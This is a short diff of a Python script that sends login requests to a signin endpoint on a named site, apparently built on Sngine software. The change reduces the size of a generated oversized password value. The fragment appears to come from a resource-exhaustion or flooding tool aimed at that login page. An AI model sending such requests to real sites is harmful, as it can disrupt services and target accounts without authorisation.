@@ -11,7 +11,7 @@ def send_requests(username):
     url = "https://middle-star.com/includes/ajax/core/signin.php"
     payload = {
         'username_email': username,
-        'password': generate_big_message(9999999)
+        'password': generate_big_message(500)
     }
     headers = {
         'User-Agent': "Sngine",
